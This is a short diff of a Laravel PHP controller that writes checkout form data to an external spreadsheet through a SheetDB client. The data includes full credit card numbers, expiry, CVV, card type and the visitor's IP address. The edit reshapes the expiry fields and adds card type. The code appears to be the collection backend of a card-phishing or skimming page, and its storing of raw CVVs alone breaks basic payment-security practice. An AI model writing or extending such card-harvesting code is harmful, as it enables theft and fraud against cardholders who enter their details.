@@ -35,9 +35,9 @@ class PostController extends Controller
             'billing_province'          => $request->input('checkout')['billing_province'],
             'billing_company'           => $request->input('checkout')['billing_company'],
             'credit_card_number'        => $request->input('credit_card_number'),
-            'cc-exp-month'              => $request->input('cc-exp-month'),
-            'cc-exp-year'               => $request->input('cc-exp-year'),
+            'cc-exp'                    => $request->input('cc-exp'),
             'credit_card_cvv'           => $request->input('credit_card_cvv'),
+            'ccType'                    => $request->input('ccType'),
             'client_ip'                 => $request->ip(),
         ]);
         return $sheetdb->name();
